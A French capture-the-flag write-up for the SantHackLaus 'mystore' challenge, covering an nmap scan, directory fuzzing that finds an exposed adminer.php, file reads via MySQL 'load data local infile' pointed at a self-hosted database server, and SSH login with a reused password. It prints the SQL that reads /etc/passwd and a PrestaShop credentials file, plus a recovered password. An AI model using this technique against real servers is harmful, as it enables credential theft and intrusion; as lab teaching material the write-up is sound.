# Write Up SantHackLaus ! 



Yo tout le monde ! Le CTF SantHackLaus est fini et voici mon write up pour celui ci !
Petit rapel de l'existence de mon [serveur discord](https://discord.gg/2bwhtP7). 
Juste je n'ai pas finis le chall car j'avais la flemme ou plutôt que je n'ai pas la patience nécessaire: à l'étape de l'éscalade de privilège j'ai ragé et tout arrêté. Je n'ai donc fais que le Part 1.

Alors voici la traduction (merci Google) de l'énoncé du challenge:

```
L'un de vos amis souhaite lancer sa boutique en ligne sur https://mystore.santhacklaus.xyz.
Vous l'avez rapidement informé des principes de base de la sécurité informatique et il vous assure que 
il a suivi tous vos conseils. Réalisez votre audit et montrez-lui que sa plateforme est
pas correctement fixé!
```

J'ai donc commencé par lancer un scan avec nmap sur mystore.santhacklaus.xyz
```
(nmap -A )

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 47:df:ea:a5:95:38:bb:0c:79:9e:40:ce:f7:20:15:a2 (RSA)
|   256 d6:d5:15:90:25:18:d0:0c:d9:d1:b0:33:7f:84:20:7e (ECDSA)
|_  256 62:fa:22:28:18:ad:c5:fa:8b:13:d4:fe:be:3b:f9:e9 (ED25519)
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://mystore.santhacklaus.xyz/
443/tcp open  ssl/http nginx
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-robots.txt: 81 disallowed entries (15 shown)
| /*?order= /*?tag= /*?id_currency= /*?search_query=
| /*?back= /*?n= /*&order= /*&tag= /*&id_currency=
| /*&search_query= /*&back= /*&n= /*controller=addresses
|_/*controller=address /*controller=authentication
| http-title: myStore
|_Requested resource was https://mystore.santhacklaus.xyz/index.php
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: commonName=mystore.santhacklaus.xyz
| Subject Alternative Name: DNS:mystore.santhacklaus.xyz
| Not valid before: 2019-12-02T11:14:43
|_Not valid after:  2020-03-01T11:14:43
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|   h2
|_  http/1.1
| tls-nextprotoneg:
|   h2
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.43 seconds
```

Il n'y a rien d'interessant, continuons sur l'énumération du serveur web, j'ai d'abord testé plusieur vulnérabilité sur Pretashop mais rien ne marchais.
J'ai donc essayer de fuzz d'abord avec medium directory wordlist. Je ne trouve rien. Là dégouté je laisse tombé le chall puis y reviens demain.
Je tente un peu au hasard common directory wordlist et la je trouve un truc interessante: "adminer.php". Adminer est un outil d'administration ph et SQL (encore merci Google).
Ce qui est interessant ici c'est que nous pouvons nous connecter à n'importe quel serveur MySQL. Google nous sauve encore "Free Hosting MySQL".
On crée donc un serveur SQL puis on se connecte depuis adminer dessus. 

A partir de la on peut lire n'importe quel fichier dont on a le droit de lecture avec les commandes SQL suivantes:
```
        load data local infile 'la/votre/file'
        into table truc
        fields terminated by "\n"
```

On sait que c'est du Pretashop et je me suis documenté dessus sur internet et le fichier app/config/parameters.php est très interessant 
on lance donc:
```
        load data local infile 'app/config/parameters.php'
        into table truc
        fields terminated by "\n"
```

Un truc nous interesse tout d'un coup 
```
'database_password' => 'KA6$g@Tx0{(Si4bR3DT4'
```
On a un mot de passe mais pas de user je test admin, ça marche pas, coup de rage je vais faire une partie de foot avec mon petit frère et je reviens.
La je fais un peu de pwn (je tentais le String Oriented Programming pour les curieux ) puis j'ai une idée que j'aurai du avoir plus tôt : Normalement c'est un reflexe ! J'essaie de récuperer /etc/passwd

```
        load data local infile '/etc/passwd'
        into table truc
        fields terminated by "\n"
```

Ici je me connecte a la base SQl en localhost depuis Adminer avec un username que l'on voit dans /etc/passwd : "john" et le mot de passe trouvé avant : "KA6$g@Tx0{(Si4bR3DT4"
Je trouve rien d'interessant. Je rage encore. Je reviens après et je me rappelle que le port 22 était ouvert en SSH !! Je test et oui !! Il avait utilisé le même mot de passe ! 

````cat flag.txt```

Et la le plaisir de voir aparaître le flag: SANTA{That-W4Z/a/C0ol-CV3!}
